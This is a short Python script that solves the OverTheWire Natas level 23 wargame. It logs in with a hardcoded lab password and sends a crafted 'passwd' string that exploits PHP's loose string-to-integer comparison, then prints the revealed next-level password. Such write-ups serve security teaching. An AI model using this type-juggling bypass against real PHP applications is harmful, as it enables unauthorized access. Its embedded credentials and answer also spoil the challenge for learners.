# Natas23 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL     = "http://natas23.natas.labs.overthewire.org/"

auth_name = 'natas23'
auth_pass = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# The entire challenge is centered around a comparison
# of a str and an int, in which the string must be the
# larger of the two, and the user supplies the string.

# Achieving a string which is larger than a given int, is
# easy in PHP, due to PHP being PHP...

# Simply set the first part of the string to be an number
# larger than that of the compared int. PHP in a nutshell...
DATA = dict(passwd="11_lol_PHP_iloveyou")

r = s.post(URL, data=DATA)

for x in r.iter_lines():
    if "Password" in x:
        print x